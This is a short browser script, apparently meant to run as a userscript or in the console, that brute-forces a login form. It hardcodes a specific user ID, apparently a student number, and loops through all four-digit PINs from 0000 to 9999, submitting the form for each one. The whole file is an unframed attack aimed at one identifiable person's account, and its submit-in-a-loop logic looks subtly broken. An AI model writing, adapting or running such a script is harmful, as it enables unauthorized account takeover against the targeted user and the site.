window.addEventListener('DOMContentLoaded', () => {
  const nimEl = document.querySelector("input[name='user_id']");
  const pinEl = document.querySelector("input[name='pwd0']");
  const form = document.querySelector('form');

  console.log(nimEl);

  if (nimEl) {
    let pin;
    const nim = (nimEl.value = 123210166);
    for (let i = 0; i < 10000; i++) {
      if (i < 10) pin = '000' + i;
      else if (i < 100) pin = '00' + i;
      else if (i < 1000) pin = '0' + i;
      else pin = i;

      pinEl.value = pin;
      form.submit();
    }
  } else {
    console.log('error');
  }
});
